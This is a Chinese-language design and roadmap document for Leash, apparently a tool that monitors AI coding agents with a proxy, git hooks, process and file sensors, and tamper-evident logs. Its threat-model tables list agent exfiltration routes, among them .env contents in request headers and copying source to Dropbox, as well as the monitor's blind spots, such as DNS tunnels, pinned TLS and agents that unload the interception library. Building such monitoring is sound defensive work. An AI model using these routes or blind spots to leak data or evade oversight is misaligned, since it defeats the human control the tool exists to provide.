- **语言**：Go 1.26 作为 Core 的实现语言和兼容基线，不必追新版本。
- **MITM 代理**：封装成熟的 proxy 实现，不自研 CONNECT/HTTP2/chunked/WebSocket/proxy-auth 处理——核心 IP 是 attribution、policy、detection、Git 语义、审计时间线，不是重新造 HTTP proxy 的轮子。
- **存储**：`modernc.org/sqlite`（纯 Go，无 cgo）+ 本地文件 blob store。
- **策略配置**：YAML，支持域名/组织粒度（例如允许 `github.com` 但拒绝创建 public gist/public repo）。
- **Dashboard 前端**：htmx + 服务端模板 + diff2html，等真出现复杂 trace graph/实时 streaming/万级虚拟化时间线再迁移到 SPA。

## 8. 威胁模型：Attack Surface Matrix

### 8.1 网络类

| 场景 | Best-effort（proxy env） | Interposed Mode（第 10.2.1 节，Target） |
|---|---|---|
| Agent 把源码当 payload POST 到陌生域名（遵循 proxy 配置） | ✅ | ✅ |
| Agent 把 `.env` 内容塞进 HTTP 请求头 | ✅ | ✅ |
| `wss://` WebSocket upgrade（客户端遵循 proxy 且 TLS MITM 成功） | ✅ | ✅ |
| SSH / SCP / SFTP / rsync-over-ssh（git push 以外的用途） | ❌，不走 HTTP_PROXY | ✅，只要走系统库 `connect()` |
| 裸 TCP socket / UDP | ❌ | ✅，同上 |
| proxy-unaware 客户端、子进程清空继承的 proxy 环境变量 | ❌ | ✅，不再依赖 env var 配合 |
| 证书钉扎（pinning）、QUIC(HTTP3) 的应用层内容检查 | ❌ | ❌，Interposed Mode 能看见"连了谁"，看不进 pinning/QUIC 加密内容 |
| DNS 隧道、系统签名保护的程序（如 macOS 自带 `curl`）、存心卸载拦截模块的 agent | ❌ | ❌，第 10.2.1 节已如实列出的盲区 |

### 8.2 本地/委托外泄类（Runtime Sensor 覆盖，归属置信度可能较低）

| 场景 | 覆盖层 | 归属置信度 |
|---|---|---|
| `cp company-source.zip ~/Dropbox/` | Runtime · File Plane | 高（agent 直接执行的文件操作） |
| browser automation 驱动已存在的 Chrome 进程上传文件 | 需 delegated-operation correlation | 低/未知，如实标注 |
| `docker.sock` → container → 网络（dockerd 早已存在，不是 agent 的 descendant） | Process Plane 能看到 `docker run` 调用本身 | 中（能看到发起动作，看不到容器内部） |
| `aws`/`gh`/`gcloud`/`kubectl`/`terraform`/`npm`/`pip` 等工具自行联网 | Process Plane | 高（exec 层可见） |

### 8.3 "目的地允许" ≠ "动作安全"

```yaml
github:
  allowed_orgs: [my-company]
  deny: [create_public_repo, create_public_gist]
```

## 9. Tamper Evidence：只解决"捕获后完整性"，不解决"捕获本身可信"

hash chain（`session_root_hash = H(...H(event_2 + H(event_1))...)`）签名后能证明"链内事件前后是否一致、有没有被事后篡改"，但明确解决不了：**capture-time omission**（sensor 压根没记录某个恶意动作）、**malicious logger**（`leashd` 自身被攻陷后能生成假事件并合法签名）、**key compromise**（signing key 与 agent 同权限域时可被整体重算重签）、**truncation/completeness**（没有可信 checkpoint 时无法证明链是否完整）。因此拆成两级：

```text
Local Integrity（默认具备）
    hash chain + seq + event_count + session manifest + start/end seal
    → 解决"本地这份数据事后有没有被改"

Trusted Evidence（企业可选）
    privileged signer / TPM / Secure Enclave + 周期性 external checkpoint
    → 缓解 capture-time omission 之外的"谁来验证这份数据从一开始就可信"问题
```

保持默认不上云，"周期性 checkpoint"作为企业可选项发给用户自己的 witness 服务，而非 Leash 托管。

## 10. 路线图

### 10.1 Leash Core Track（纯 Go，不含特权组件）

1. **v0.1 — 第 0 节范围**：Session（struct）+ Proxy + Git Shim + `Scan()` + Policy + 单表 Event。Demo：`.env` POST → BLOCK，`git push` 到陌生仓库 → BLOCK。命令行输出即可。**已完成**：经安全 review 修复 6 个真实漏洞，测试+CI 上线。
2. **v0.2 — Process visibility**（**已完成**）：
   - ✅ **YAML policy**（域名 allow/deny + `github.com` action 级策略）—— `internal/policy/config.go`
   - ✅ **`core.hooksPath` 全局 hook**（session 级 `GIT_CONFIG_*` 注入，不碰 `~/.gitconfig`）—— `internal/gitshim/hook.go`
   - ✅ `leash doctor`（第 8 节覆盖状态自检）—— `cmd/leash/doctor.go`
   - ✅ 第二个 harness（Claude Code，`NODE_EXTRA_CA_CERTS`）
   - ✅ secret 检测规则库扩充（新增 GitLab/Slack/Stripe/Google/npm token、PEM 私钥头）
   - ✅ Runtime Sensor · Process Plane（轮询 `ps` + 父子 PID 谱系，record-only）—— `internal/procwatch`
   - ✅ **Attribution Engine 第一版**（ancestry-based，第 5.2 节证据模型的 macOS 用户态子集——没有 cgroup/audit token 这类内核级证据，只有进程谱系）
3. **v0.3 — Flight recorder**（**已完成**）：
   - ✅ **Dashboard**（`leash dashboard`，`internal/dashboard`）：session 列表 + 每个 session 的时间线，纯 `html/template` 服务端渲染，无 JS/CDN 依赖，只读、只绑 127.0.0.1
   - ✅ **Git diff viewer**：pre-push hook 在放行时用它拿到的精确 local/remote SHA 对捕获 `git diff --stat`（只有文件名和增删行数，不含代码内容），存成 `git_diff_stat` 事件，Dashboard 里以 `<pre>` 展示
   - ✅ **Session 回放**：每个 session 的事件按时间线顺序展示，就是 Dashboard 的核心视图
   - ✅ **Runtime Sensor · File Plane MVP**（`internal/filewatch`）：用 fsnotify（macOS 上是 kqueue，无需 cgo）监听 session 工作目录，record-only，排除 `.git`/`node_modules`/`vendor` 等噪音目录，单 session 硬上限 5000 条防止暴增
   - ✅ **Retention**：`policy.yaml` 的 `retention.days`（默认 30），每个 session 启动时自动 prune 过期事件并 VACUUM
4. **v0.4 — Core 成熟化**：detection 准确率、性能、multi-session、Attach Provider / Harness Adapter（第一次真正需要 `SessionProvider` 抽象的时候）。
5. **v0.5 — Enterprise Evidence（仍是 Core，纯软件）**：Local Integrity 默认具备，Trusted Evidence 作为企业可选项，policy snapshot，HTML/PDF 合规报告导出。
6. **v0.6 — Supply Chain**：skill/plugin/MCP 静态扫描，明确排最后，因为不是核心差异化能力。

### 10.2 拦截覆盖面的两条路，不是一条

v9 之前只有一条"防绕过"路径（Platform Enforcement Track），而且被正确地判定为工程量级太重、不该和 Core Track 的版本号绑在一起。现在拆成两条独立的路，第一条比原来设想的轻得多：

#### 10.2.1 Library Interposition Track（轻量，可以留在 Core Track 里）

核心机制：`DYLD_INSERT_LIBRARIES`（macOS）/ `LD_PRELOAD`（Linux）在被 `leash run` 启动的进程里注入一个小的原生动态库，接管 `connect()`/`socket()` 这类系统库函数——所有经过系统库发起网络连接的流量都会先过这一层，不管上层协议是 HTTP、SSH 还是别的，也不再依赖 agent 自己"愿不愿意"读 `HTTP_PROXY`。因为只作用于被启动的这一个进程树、不改任何系统级配置，不需要 root、不需要苹果/微软的特殊授权，跟现在往子进程里注入环境变量、往 `PATH` 里塞 git shim 是同一类"session 启动时动手脚"的手法，只是这次伸到了更底层的系统调用入口。

```text
I0  可行性原型：macOS 下用 DYLD_INSERT_LIBRARIES 拦截 connect()，验证对 curl/node/python/ssh 等常见工具有效
I1  正式集成进 leash run：session 启动时生成/复用这个原生库，自动注入
I2  Linux 对应实现（LD_PRELOAD），处理和 macOS 不同的细节
```

已知覆盖不到的场景，需要如实写进第 8.1 节而不是藏起来：

- 苹果对自身签名保护的系统程序（比如 `/bin/bash`、系统自带的 `curl`）做了防注入保护，这类程序不受影响；但 codex、node、python 这些用户自己装的工具不受此限制
- 极少数不经过系统库、直接和内核系统调用打交道的程序（Linux 上纯静态编译、不链接 glibc 的程序理论上可以这样，macOS 上这种情况少见）
- 存心识别并卸载这个注入模块的 agent——这已经是主动对抗级别的场景，Library Interposition 不是为了对抗这种场景设计的，Enforced Mode（10.2.2）才是

即便有这些盲区，它依然把 Best-effort Mode 完全看不见的"SSH 除 git 外的用途、裸 TCP、UDP"（第 8.1 节）收进了覆盖范围，性价比远高于直接冲 Enforced Mode。

#### 10.2.2 Platform Enforcement Track（重量级，独立工作流，不用 Core 版本号背书）

真正的"agent 无法绕过、对抗性场景下依然成立"的 Enforced Mode，还是要靠操作系统内核层的强制能力——macOS 需要 Endpoint Security entitlement + System Extension + app 签名/公证/升级生命周期；Windows 需要 kernel-mode minifilter driver + EV 签名证书 + Hardware Dev Center 审批。这些是独立的平台安全工程量级，不是"下一个 feature"，单独编号，不与 Core Track 的版本号绑定：

```text
E0  可行性原型（建议从 macOS EndpointSecurity 开始）
E1  macOS enforced provider（System Extension，完整签名/分发链路）
E2  Linux privileged provider（eBPF/fanotify + capabilities）
E3  Windows provider（minifilter，kernel driver 签名）
```

Enforced Mode 的可用性 = Core 版本 × 对应平台 Provider 的成熟度（例如 "Leash Core 0.8 + macOS Enforcer E1 → macOS Enforced Preview"），而不是简单的 Core 版本号推进。一个强的个人开发者或 3-5 人团队完全可能做出其中一个平台的 provider，但这需要平台 entitlement/signing/deployment 相关的专门能力，不是 Core 功能迭代的自然延伸，路线图上必须诚实地把这件事和 Core Track 分开标注。

**两条路的关系**：不是二选一，是先后关系。Library Interposition（10.2.1）门槛低、能在 Core Track 里较快做出来，先把 Interposed Mode 立起来，把 Best-effort 和真正的 Enforced 之间的巨大空当填上一部分；Platform Enforcement Track（10.2.2）依然是终局目标，但不再是唯一能讲的"防绕过"故事，可以按自己的节奏推进而不阻塞产品往前走。

## 11. 仍然开放、需要持续验证的风险

- **v0.1 的 detection 规则集是否够用**：先用少量高置信度规则（已知 token 前缀、`.env` 路径上下文）跑通 demo，不追求覆盖率，避免第一版就陷入规则调优的无底洞。
- **Attribution Engine 的可靠边界**（v0.2 时验证）：cgroup/Job Object/EndpointSecurity audit token 在不同平台的可用性和粒度不一致，需要原型验证三个平台各自能做到的归属置信度上限。
- **per-session proxy 端口的 stale-reuse 和 spoofing 风险**（第 5.3 节）：v0.1 先如实标注为 best-effort，观察真实使用中这两个风险的实际发生频率，再决定是否需要在 v0.2 引入 session credential。
- **Git shim 对 libgit2/go-git 类库调用的盲区**：需要评估这类调用方式在真实 agent harness 里出现的频率。
- **Enforced Mode 的特权组件分发成本**：EndpointSecurity System Extension / Windows 签名驱动的审批、分发、企业 MDM 部署流程，本身就是不小的工程量和信任成本，在启动 E1/E2/E3 之前需要专门评估。
- **委托外泄的归因上限**：browser automation、容器内网络等场景下，delegated-operation correlation 能做到多可靠，需要原型验证后再确定纳入哪个版本，且需要对用户诚实展示"低置信度"而不是给出确定性归因的假象。
- **Library Interposition（第 10.2.1 节）的真实覆盖率，写进文档前必须先用原型验证**：目前只是技术洞察，还没做过 I0 可行性原型。至少要在 macOS 上实测：① `DYLD_INSERT_LIBRARIES` 对 codex/node/python/ssh/curl 等真实工具是否真的生效（而不是理论上应该生效）；② Go 编译的二进制在 macOS 上是否确实稳定走系统库 `connect()`（这是这条路径成立的前提假设，需要用真实 Go 程序验证，不能只凭对平台 ABI 的一般认知就下结论）；③ macOS 的完整性保护机制在哪些具体路径/场景下会拒绝这次注入，把"哪些工具会生效、哪些不会"列成一张实测清单，而不是笼统一句"用户自己装的工具不受限制"。
